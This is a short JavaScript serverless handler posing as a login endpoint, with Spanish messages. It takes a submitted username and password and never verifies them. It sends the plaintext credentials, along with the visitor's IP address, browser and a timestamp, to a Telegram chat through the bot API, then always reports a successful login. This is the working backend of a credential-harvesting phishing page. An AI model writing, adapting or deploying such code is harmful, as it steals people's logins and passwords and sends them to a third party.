
// api/login.js
export default async function handler(req, res) {
  // Solo permitir POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const { username, password } = req.body;

    // Validar datos
    if (!username || !password) {
      return res.status(400).json({ 
        success: false,
        message: 'Usuario y clave son requeridos' 
      });
    }

    // Obtener información adicional
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress || 
               'IP desconocida';
    
    const userAgent = req.headers['user-agent'] || 'User-Agent desconocido';
    const timestamp = new Date().toLocaleString('es-CO', { 
      timeZone: 'America/Bogota',
      dateStyle: 'full',
      timeStyle: 'long'
    });

    // Configuración de Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Variables de entorno de Telegram no configuradas');
      // Continuar sin enviar notificación
    }

    // Construir mensaje para Telegram
    const message = `
🔔 *Nuevo Acceso Detectado*

👤 *Usuario:* \`${username}\`
🔐 *Clave:* \`${password}\`

📍 *Detalles de Conexión:*
🌐 IP: \`${ip}\`
🕒 Fecha: ${timestamp}

🖥️ *Navegador:*
${userAgent}

━━━━━━━━━━━━━━━━━━━━
    `.trim();

    // Enviar notificación a Telegram
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        });

        console.log('Notificación enviada a Telegram');
      } catch (telegramError) {
        console.error('Error al enviar a Telegram:', telegramError);
      }
    }

    // Responder al cliente
    return res.status(200).json({
      success: true,
      message: 'Sesión iniciada correctamente'
    });

  } catch (error) {
    console.error('Error en el servidor:', error);
    return res.status(500).json({
      success: false,
      message: 'Error en el servidor'
    });
  }
}
